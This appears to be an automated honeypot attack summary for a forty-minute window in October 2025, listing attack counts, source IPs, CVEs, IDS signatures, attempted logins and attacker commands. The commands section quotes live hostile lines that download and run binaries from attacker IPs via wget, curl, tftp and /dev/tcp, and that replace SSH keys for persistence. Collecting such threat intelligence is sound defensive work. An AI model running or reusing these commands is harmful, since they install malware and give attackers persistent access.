Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-19T15:01:40Z
**Timeframe:** 2025-10-19T14:20:01Z to 2025-10-19T15:00:01Z
**Log Files:**
- agg_log_20251019T142001Z.json
- agg_log_20251019T144001Z.json
- agg_log_20251019T150001Z.json

### Executive Summary
This report summarizes 24,768 attacks recorded by the honeypot network. The majority of attacks were captured by the Cowrie honeypot, with a significant number of events also logged by Honeytrap and Suricata. Attackers primarily focused on ports related to SMB (445), SIP (5060), and SSH (22). A number of CVEs were detected, with CVE-2005-4050 being the most frequent.

### Detailed Analysis

**Attacks by Honeypot:**
- Cowrie: 9749
- Honeytrap: 4874
- Suricata: 4249
- Sentrypeer: 2476
- Dionaea: 1558
- Mailoney: 862
- Ciscoasa: 824
- Redishoneypot: 100
- H0neytr4p: 43
- Tanner: 15
- ConPot: 10
- ElasticPot: 3
- Heralding: 3
- ssh-rsa: 2

**Top Attacking IPs:**
- 41.33.197.132: 1556
- 84.162.68.10: 1517
- 198.23.238.154: 1454
- 194.50.16.73: 2064
- 72.146.232.13: 1217
- 198.23.190.58: 1216
- 23.94.26.58: 1172
- 64.188.71.244: 1148
- 198.12.68.114: 861
- 176.65.141.119: 821

**Top Targeted Ports/Protocols:**
- 5060: 2476
- 22: 2197
- TCP/445: 1551
- 445: 1522
- 5038: 1300
- UDP/5060: 1409
- 5903: 239
- 8333: 140
- 6379: 100
- TCP/22: 144

**Most Common CVEs:**
- CVE-2005-4050
- CVE-2010-0569
- CVE-2021-3449
- CVE-2021-35394
- CVE-2006-2369
- CVE-2023-26802
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517
- CVE-2019-11500
- CVE-2023-27076

**Commands Attempted by Attackers:**
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password: 
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- top
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.156.152.237/bins/x86; curl -O http://94.156.152.237/bins/x86; chmod 777 x86; ./x86; tftp 94.156.152.237 -c get x86; chmod 777 x86; ./x86; rm -rf x86
- tftp; wget; /bin/busybox IOACF
- nohup bash -c "exec 6<>/dev/tcp/129.144.180.26/60107 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/gAgh8Y4XFe && chmod +x /tmp/gAgh8Y4XFe && /tmp/gAgh8Y4XFe dbanPWPxdFdLcuhhIqKkDgKmpz9gpSXzkI++BofiRWHbnGWzkf3t" &

**Signatures Triggered:**
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1549
- ET VOIP MultiTech SIP UDP Overflow: 1391
- ET DROP Dshield Block Listed Source group 1: 273
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 140
- ET SCAN NMAP -sS window 1024: 158
- ET SCAN Potential SSH Scan: 138
- ET HUNTING RDP Authentication Bypass Attempt: 53
- ET INFO Reserved Internal IP Traffic: 58
- ET CINS Active Threat Intelligence Poor Reputation IP group 96: 12
- ET CINS Active Threat Intelligence Poor Reputation IP group 3: 16
- ET CINS Active Threat Intelligence Poor Reputation IP group 13: 7
- ET SCAN Suspicious inbound to PostgreSQL port 5432: 21
- ET SCAN Suspicious inbound to MSSQL port 1433: 14
- ET CINS Active Threat Intelligence Poor Reputation IP group 99: 8

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34: 16
- user01/Password01: 12
- deploy/123123: 6
- supervisor/supervisor2024: 6
- user/00: 6
- centos/administrator: 6
- unknown/33333: 6
- unknown/1qaz2wsx: 6
- nobody/nobody2019: 6
- test/11: 7

**Files Uploaded/Downloaded:**
- icanhazip.com: 2
- x86;: 2
- rondo.naz.sh|sh&...: 1
- ohsitsvegawellrip.sh|sh;#: 1
- luci: 1

**HTTP User-Agents:**
- (No user agents recorded in this period)

**SSH Clients:**
- (No SSH clients recorded in this period)

**SSH Servers:**
- (No SSH servers recorded in this period)

**Top Attacker AS Organizations:**
- (No AS organizations recorded in this period)

### Key Observations and Anomalies
- The high number of attacks on port 445 (SMB) from IP 41.33.197.132, triggering the DoublePulsar backdoor signature, suggests a targeted campaign against this vulnerability.
- A significant number of reconnaissance and system information gathering commands were executed, indicating attackers are performing initial assessment of the compromised systems.
- The command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."` was frequently used, which is a common technique to establish persistent access to a machine.
- Several download attempts of malicious binaries were observed, with files named `x86` and `luci`.
- The absence of HTTP User-Agents, SSH client/server information, and AS organization data might indicate that the honeypots capturing this information did not receive relevant traffic during this period.
